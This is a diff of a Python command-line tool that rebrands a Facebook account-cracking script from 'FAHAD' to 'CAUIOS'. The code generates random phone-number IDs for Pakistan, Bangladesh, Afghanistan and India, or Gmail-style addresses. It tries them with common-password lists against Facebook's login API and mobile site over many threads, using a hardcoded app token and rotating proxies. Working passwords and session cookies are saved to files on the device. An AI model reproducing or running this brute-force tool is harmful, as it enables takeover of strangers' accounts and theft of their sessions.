@@ -27,7 +27,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python Fahad.py')  
+        os.system('python CAUIOS.py')  
         
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
@@ -165,8 +165,8 @@ sock=open('socks4.txt','r').read().splitlines()
 #__________FOLDER MAKE_________#
 
 try:
-    os.mkdir('FAHAD')
-    os.system('mv FAHAD /sdcard')
+    os.mkdir('CAUIOS')
+    os.system('mv CAUIOS /sdcard')
 except:
     pass
    
@@ -177,7 +177,7 @@ class jalan:
             sys.stdout.write(e)
             sys.stdout.flush()
             time.sleep(0.0001)
-sys.stdout.write('\x1b[1;35m\x1b]2; FAHAD \x07')   
+sys.stdout.write('\x1b[1;35m\x1b]2; CAUIOS \x07')   
     
 
 def clear():
@@ -244,12 +244,12 @@ def asha(uid):
     else:alif=''
     return alif
 #_________[ LOGIN KEY ]______>>
-"""CorrectUsername = 'FAHAD'
+"""CorrectUsername = 'CAUIOS'
 key = 'true'
 while key == 'true':
     username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
     if username == CorrectUsername:
-            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN FAHAD TOOL SUCCESSFULLY') 
+            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN CAUIOS TOOL SUCCESSFULLY') 
             time.sleep(1)
             clear()
             key = 'false'"""
@@ -291,12 +291,12 @@ def menu():
                         print('[3] Contact owner')                                    
                         print('[0] Exit ')
                         line()
-                        xd=input(' Choose An Option: ')
+                        xd=input(' Choose an Option: ')
                         
                         if xd in ['1','01']:
                                 clear()
                                 
-                                print(' \033[1;32mPut File Example :  /sdcard/csyx.txt')
+                                print(' \033[1;32mPut File Example :  /sdcard/csyx.txt ')
                                 line()
                                 file = input(' Put File Path\033[1;37m: ')
                                 try:
@@ -327,7 +327,7 @@ def menu():
                                         plist.append(input(f' Put Password {i+1}: '))
                                 line()
                                 clear()
-                                print(' DO YOU WENT SHOW COOKIES :? (Y/N): ')
+                                print(' DO YOU WANT SHOW COOKIES :? (Y/N): ')
                                 line()
                                 cx=input(' CHOOSE : ')
                                 if cx in ['y','Y','yes','Yes','1']:
@@ -339,7 +339,7 @@ def menu():
                                         total_ids = str(len(fo))
                                         
                                         print(' Total Account : \033[1;32m'+total_ids+f' ')
-                                        print("\033[1;37m Cloning Start\033[1;37m")
+                                        print("\033[1;32m [\033[1;91mON/\033[1;37mOFF\033[1;37m] \033[1;32mAIRPLANE MODE FOR SPEED UP :)\033[1;37m")
                                         line()
                                         for user in fo:
                                                 ids,names = user.split('|')
@@ -358,7 +358,7 @@ def menu():
                                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 line()
                                 input(' Press enter to back ')
-                                os.system('python Fahad.py')
+                                os.system('python CAUIOS.py')
                         elif xd in ['2','02']:
                                 clear()
                                 print(' [1] Pakistan\n [2] Bangladesh\n [3] Afghanistan\n [4] India\n [5] Gmail\n [0] Back Menu')
@@ -392,15 +392,15 @@ def group():
     print(' [\033[1;32m2\033[97;1m] Join WhatsApp Group')
     print(' [\033[1;32m3\033[97;1m] Join Facebook Group')
     print(' [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');line()
-    FAHAD=input(' [•] Choose : ')
-    if FAHAD == '1':
+    CAUIOS=input(' [•] Choose : ')
+    if CAUIOS == '1':
         os.system('xdg-open https://wa.me/+923320713429?text=')
         menu()
-    if FAHAD == '2':
+    if CAUIOS == '2':
         os.system('xdg-open https://chat.whatsapp.com/G8SCDMMvgiN3yCYGORqHU0');menu()
-    if FAHAD == '3':
+    if CAUIOS == '3':
         os.system('xdg-open https://facebook.com/groups/652365376222916/');menu()
-    if FAHAD == '0':
+    if CAUIOS == '0':
         menu()
     else:
         line();print(' [•] Selected Wrong Option ');time.sleep(2);menu()
@@ -417,7 +417,7 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as FAHAD:     
+                with tred(max_workers=30) as CAUIOS:     
                         clear()
                         
                         tl = str(len(user))
@@ -428,14 +428,14 @@ def pak():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123','janjan','ali123']
-                                FAHAD.submit(rd,ids,passlist)
+                                CAUIOS.submit(rd,ids,passlist)
                 print('\033[1;37m')
                 line()
                 print(' the process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 line()
                 input(' Press enter to back ')
-                os.system('python Fahad.py')
+                os.system('python CAUIOS.py')
 def bd():
                 user=[]
                 clear()
@@ -448,7 +448,7 @@ def bd():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
                         user.append(nmp)
-                with tred(max_workers=30) as FAHAD:     
+                with tred(max_workers=30) as CAUIOS:     
                         clear()
                         
                         tl = str(len(user))
@@ -459,14 +459,14 @@ def bd():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,ids[:8],ids[:7],'mimmim','fatema','jannat','sadiya','Bangla','@@@###','304050','102030','203040','708090','i love you','FREE FIRE','free fire','bangladesh','bangla']
-                                FAHAD.submit(bd1,ids,passlist)
+                                CAUIOS.submit(bd1,ids,passlist)
                 print('\033[1;37m')
                 line()
                 print(' the process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 line()
                 input(' Press enter to back ')
-                os.system('python Fahad.py')
+                os.system('python CAUIOS.py')
 
 def afg():
                 user=[]
@@ -480,7 +480,7 @@ def afg():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as FAHAD:     
+                with tred(max_workers=30) as CAUIOS:     
                         clear()
                         
                         tl = str(len(user))
@@ -491,14 +491,14 @@ def afg():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
-                                FAHAD.submit(rd,ids,passlist)
+                                CAUIOS.submit(rd,ids,passlist)
                 print('\033[1;37m')
                 line()
                 print(' the process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 line()
                 input(' Press enter to back ')
-                os.system('python Fahad.py')
+                os.system('python CAUIOS.py')
 def ind():
                 user=[]
                 clear()
@@ -511,7 +511,7 @@ def ind():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as FAHAD:     
+                with tred(max_workers=30) as CAUIOS:     
                         clear()
                         
                         tl = str(len(user))
@@ -522,19 +522,19 @@ def ind():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'57273200','hindustan','59039200','57575751']
-                                FAHAD.submit(rd,ids,passlist)
+                                CAUIOS.submit(rd,ids,passlist)
                 print('\033[1;37m')
                 line()
                 print(' the process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 line()
                 input(' Press enter to back ')
-                os.system('python Fahad.py')
+                os.system('python CAUIOS.py')
                 
 def gmail():
                 os.system('rm -rf .re.txt')
                 clear()
-                print('\033[1;37m Example: aania, ali, fahad, zahra\033[1;97m')
+                print('\033[1;37m Example: aania, ali, CAUIOS, zahra\033[1;97m')
                 line()
                 first = input(' Put first name: ')
                 line()
@@ -562,7 +562,7 @@ def gmail():
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
-                with tred(max_workers=30) as FAHAD:
+                with tred(max_workers=30) as CAUIOS:
                         total = str(len(fo))
                         clear()
                         print(' Total Account: \033[1;32m'+total)
@@ -579,14 +579,14 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',ls+'123',fs+ls+'123',ls+'12345','khankhan','57273200']
-                                FAHAD.submit(rd,ids,passlist)
+                                CAUIOS.submit(rd,ids,passlist)
                 print('\033[1;37m')
                 line()
                 print(' the process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 line()
                 input(' Press enter to back ')
-                os.system('python Fahad.py')
+                os.system('python CAUIOS.py')
 
 def ffb(ids,names,passlist):
         global loop,oks,cps,ugen
@@ -616,14 +616,14 @@ def ffb(ids,names,passlist):
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [CAUIOS-OK] %s | %s'%(ids,pas))
                                # cek_apk(session,coki)
-                                open('/sdcard/FAHAD/FAHAD-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/FAHAD/FAHAD-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
+                                open('/sdcard/CAUIOS/CAUIOS-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/CAUIOS/CAUIOS-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                               
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in fadi:
                                 if 'y' in pcp:
                                         print('\r\r\x1b[38;5;208m [SYX-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/FAHAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/CAUIOS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -653,14 +653,14 @@ def api1(ids,names,passlist):
 				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 				cookies = f"sb={ssbb};{ckkk}"
-				print('\033[1;33m [🍪] Cookies :- '+cookies)
+				print('\033[1;33m [ COOKIE ]:- '+cookies)
 				cek_apk(session,coki)
 				open('/sdcard/CAUIOS/CAUIOS-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
 				oks.append(uid)
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
-				print(f'\r\r\033[1;33m [SYX-CP] '+uid+' | '+pas+'\033[1;97m')
+				print(f'\r\r\033[1;91m [SYX-CP] '+uid+' | '+pas+'\033[1;97m')
 				open('/sdcard/CAUIOS/CAUIOS-CP.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
@@ -675,7 +675,7 @@ def rd(ids,passlist):
 	try:
 		global oks,loop
                 
-		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mFAHAD\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mCAUIOS\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
 		for pas in passlist:                                          
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'			
 			head = {'User-Agent':F1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
@@ -683,20 +683,20 @@ def rd(ids,passlist):
 			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])                                  
-				print('\r\r\033[1;32m [FAHAD-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
+				print('\r\r\033[1;32m [CAUIOS-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
 				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 				cookies = f"sb={ssbb};{ckkk}"
 			#	print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
 				#cek_apk(session,coki)
-				open('/sdcard/FAHAD/FAHAD-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
+				open('/sdcard/CAUIOS/CAUIOS-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
 				oks.append(uid)
                                 
 				break
 			elif 'www.facebook.com' in po['error']['message']:                                
 				uid = str(po['error']['error_data']['uid'])
-				print(f'\r\r\033[1;33m [FAHAD-CP] '+uid+' | '+pas+'\033[1;97m')
-				open('/sdcard/FAHAD/FAHAD-R-CP.txt','a').write(uid+'|'+pas+'\n')
+				print(f'\r\r\033[1;33m [CAUIOS-CP] '+uid+' | '+pas+'\033[1;97m')
+				open('/sdcard/CAUIOS/CAUIOS-R-CP.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -713,7 +713,7 @@ def bd1(ids,passlist):
     try:
         for ps in passlist:            
             session = requests.Session()
-            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mFAHAD\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	            
+            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mCAUIOS\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	            
             pro = random.choice(F1())            
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -763,19 +763,19 @@ def bd1(ids,passlist):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m [FAHAD-OK] '+ids+' | '+ps)                
+                print('\r\r\033[1;32m [CAUIOS-OK] '+ids+' | '+ps)                
                 #print('\033[1;37m [🍪] Cookies :- '+coki)                
-                open('/sdcard/FAHAD/FAHAD-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
+                open('/sdcard/CAUIOS/CAUIOS-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print(f'\r\r\033[1;33m [FAHAD-CP] '+ids+' | '+ps+'\033[1;97m')
-                open('/sdcard/FAHAD-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
+                #print(f'\r\r\033[1;33m [CAUIOS-CP] '+ids+' | '+ps+'\033[1;97m')
+                open('/sdcard/CAUIOS-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                 cps.append(cid)
             elif twf in session.cookies.get_dict().keys():
-                print('\033[1;93m\033[0;34mFAHAD-2F '+ids+' • '+ps+'  \033[0;97m')
+                print('\033[1;93m\033[0;34mCAUIOS-2F '+ids+' • '+ps+'  \033[0;97m')
                 break
             else:
                 continue
@@ -808,13 +808,13 @@ def newidx(ids,names,passlist):
 				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 				cookies = f"sb={ssbb};{ckkk}"
 				print('\033[1;37m [🍪] Cookies :- '+cookies)
-				open('/sdcard/FAHAD/FAHAD/FAHAD-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
+				open('/sdcard/CAUIOS/CAUIOS/CAUIOS-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
 				oks.append(uid)
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
 				print(f'\r\r\033[1;33m [SYX-CP] '+uid+' | '+pas+'\033[1;97m')
-				open('/sdcard/FAHAD-CP.txt','a').write(uid+'|'+pas+'\n')
+				open('/sdcard/CAUIOS-CP.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
 			else:
